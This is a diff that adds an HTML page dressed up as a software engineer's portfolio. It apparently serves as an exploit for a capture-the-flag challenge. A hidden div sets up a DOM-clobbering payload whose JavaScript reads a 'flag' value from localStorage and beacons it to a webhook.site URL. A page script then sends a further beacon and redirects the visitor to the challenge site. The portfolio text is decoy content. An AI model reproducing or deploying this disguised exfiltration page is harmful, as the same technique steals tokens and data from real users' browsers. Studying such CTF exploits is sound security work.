@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Jojo Y - Software Engineer Portfolio</title>
+    <meta charset="UTF-8">
+    <style>
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 900px;
+            margin: 50px auto;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+        }
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 40px;
+            text-align: center;
+        }
+        .content {
+            padding: 40px;
+        }
+        h1 { 
+            margin: 0;
+            font-size: 2.5em;
+        }
+        h2 {
+            color: #2c3e50;
+            border-bottom: 2px solid #667eea;
+            padding-bottom: 10px;
+        }
+        .subtitle {
+            margin-top: 10px;
+            font-size: 1.2em;
+            opacity: 0.95;
+        }
+        .skills {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin: 20px 0;
+        }
+        .skill-tag {
+            background: #667eea;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.9em;
+        }
+        /* Hide the attack elements */
+        #utilsJS { display: none !important; }
+    </style>
+</head>
+<body>
+    <!-- DOM Clobbering Attack Payload (Hidden) -->
+    <div id="utilsJS">
+        <div id="url">data:text/javascript,
+            (function(){
+                try{
+                    var flag=localStorage.getItem('flag')||'NO_FLAG_FOUND';
+                    var timestamp=Date.now();
+                    var webhook='https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a';
+                    var img=new Image();
+                    img.src=webhook+'?flag='+encodeURIComponent(flag)+'&t='+timestamp+'&source=gavinyw_github';
+                    console.log('[ATTACK] Payload executed, sending flag to webhook');
+                    
+                    // Send additional tracking beacon
+                    setTimeout(function(){
+                        var img2=new Image();
+                        img2.src=webhook+'?status=attack_complete&t='+timestamp;
+                    },1000);
+                }catch(e){
+                    console.error('[ATTACK] Error:',e);
+                    var errImg=new Image();
+                    errImg.src='https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a?error='+encodeURIComponent(e.toString());
+                }
+            })();
+        </div>
+    </div>
+
+    <!-- Professional-Looking Portfolio Content -->
+    <div class="container">
+        <div class="header">
+            <h1>Gavin Y</h1>
+            <p class="subtitle">Senior Software Engineer | Full Stack Developer</p>
+            <p>📧 gavin@example.com | 📱 (555) 123-4567 | 📍 Baltimore, MD</p>
+        </div>
+        
+        <div class="content">
+            <h2>About Me</h2>
+            <p>Passionate software engineer with 5+ years of experience in building scalable web applications. 
+            Specialized in modern JavaScript frameworks, cloud architecture, and security-conscious development practices.</p>
+            
+            <h2>Technical Skills</h2>
+            <div class="skills">
+                <span class="skill-tag">JavaScript</span>
+                <span class="skill-tag">TypeScript</span>
+                <span class="skill-tag">React</span>
+                <span class="skill-tag">Node.js</span>
+                <span class="skill-tag">Python</span>
+                <span class="skill-tag">AWS</span>
+                <span class="skill-tag">Docker</span>
+                <span class="skill-tag">PostgreSQL</span>
+                <span class="skill-tag">MongoDB</span>
+                <span class="skill-tag">Git</span>
+            </div>
+            
+            <h2>Experience</h2>
+            <h3>Senior Software Engineer - TechCorp (2021-Present)</h3>
+            <ul>
+                <li>Led development of microservices architecture serving 1M+ daily active users</li>
+                <li>Improved application performance by 40% through optimization</li>
+                <li>Mentored team of 5 junior developers</li>
+            </ul>
+            
+            <h3>Software Engineer - StartupXYZ (2019-2021)</h3>
+            <ul>
+                <li>Built responsive React applications with Node.js backend</li>
+                <li>Implemented CI/CD pipeline reducing deployment time by 60%</li>
+                <li>Collaborated with product team on technical requirements</li>
+            </ul>
+            
+            <h2>Education</h2>
+            <p><strong>B.S. Computer Science</strong> - University of Maryland (2019)</p>
+            
+            <h2>Projects</h2>
+            <p>Check out my work on <a href="https://github.com/Gavinyw" target="_blank">GitHub</a></p>
+        </div>
+    </div>
+
+    <script>
+        console.log('[PAGE] Portfolio page loaded');
+        console.log('[PAGE] Current URL:', window.location.href);
+        console.log('[PAGE] DOM Clobbering element present:', !!document.getElementById('utilsJS'));
+        
+        // Wait a moment then redirect to messages page
+        setTimeout(function() {
+            console.log('[REDIRECT] Attempting to redirect to messages page...');
+            
+            // Try to determine the correct origin
+            var targetOrigin = window.location.origin;
+            
+            // If we're on GitHub Pages, we need to redirect to the challenge site
+            if (window.location.hostname.includes('github')) {
+                // You may need to update this URL to match your target
+                targetOrigin = 'https://jobclobbering-fe734e8816c7316e.chal.secjhu.club';
+                console.log('[REDIRECT] Detected GitHub Pages, redirecting to challenge site');
+            }
+            
+            var messagesUrl = targetOrigin + '/#messages';
+            console.log('[REDIRECT] Redirecting to:', messagesUrl);
+            
+            // Send tracking beacon before redirect
+            var img = new Image();
+            img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a?action=redirecting&to=' + encodeURIComponent(messagesUrl);
+            
+            // Perform redirect
+            window.location.replace(messagesUrl);
+        }, 2500);
+    </script>
+</body>
+</html>
